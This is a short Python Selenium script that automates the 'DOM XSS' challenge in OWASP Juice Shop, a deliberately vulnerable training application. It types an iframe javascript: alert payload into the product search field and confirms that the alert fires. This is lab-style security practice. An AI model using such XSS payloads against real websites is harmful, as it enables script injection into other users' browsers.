# This file will allow us to exploit the search functionality of the OWASP Juice Shop
# using XSS to create a popup message.

# Completes the achievement "XSS - DOM XSS"

# Import librareis
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# This will test the vulnerability of the product search on the OWASP Juice Shop.
def test_xss(driver, base_url, sleep):
    try:
        driver.get(f"{base_url}/#/search")
        time.sleep(2)

        search_icon = driver.find_element(By.XPATH, "//mat-icon[contains(text(), 'search')]")
        search_icon.click()

        payload = '<iframe src="javascript:alert(`xss`)">'
        search = driver.find_element(By.ID, "mat-input-1")
        search.send_keys(payload)
        time.sleep(sleep)
        search.send_keys(Keys.RETURN)

        time.sleep(2)

        alert = driver.switch_to.alert
        alert_text = alert.text
        time.sleep(sleep)
        alert.accept()

        if "xss" in alert_text.lower():
            return True
        else:
            print("Text in the alert didn't line up with provided.")
            return False
    except Exception as e:
        print(f"An exception occured: {e}")
        return False

    